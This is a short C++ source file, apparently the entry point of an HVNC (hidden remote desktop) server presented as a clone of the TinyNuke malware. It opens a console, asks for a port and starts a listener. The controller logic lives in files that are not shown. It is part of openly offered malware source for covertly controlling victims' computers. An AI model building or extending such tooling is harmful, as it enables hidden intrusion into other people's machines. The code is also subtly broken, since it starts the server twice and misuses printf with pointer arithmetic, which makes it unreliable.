#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#include "_version.h"
#include <thread>
#include <chrono>
#include <iostream>
#include <stdlib.h>

int port;
int CALLBACK WinMain(HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR lpCmdLine,
   int nCmdShow)
{
   AllocConsole();

   freopen("CONIN$", "r", stdin); 
   freopen("CONOUT$", "w", stdout); 
   freopen("CONOUT$", "w", stderr); 

   SetConsoleTitle(TEXT("HVNC - Tinynuke Clone [Melted@HF]"));
   
   std::cout << "[!] Server Port: ";
   std::cin >> port;

   std::system("CLS");
   printf("[-] Starting HVNC Server...\n");

   StartServer(port);

   printf("[+] Server Started!\n");
   printf("[+] Listening on Port: " + port);

   if(!StartServer(atoi(lpCmdLine)))
   {
      wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError()); 
      getchar();
      return 0;
   }
   return 0;
}
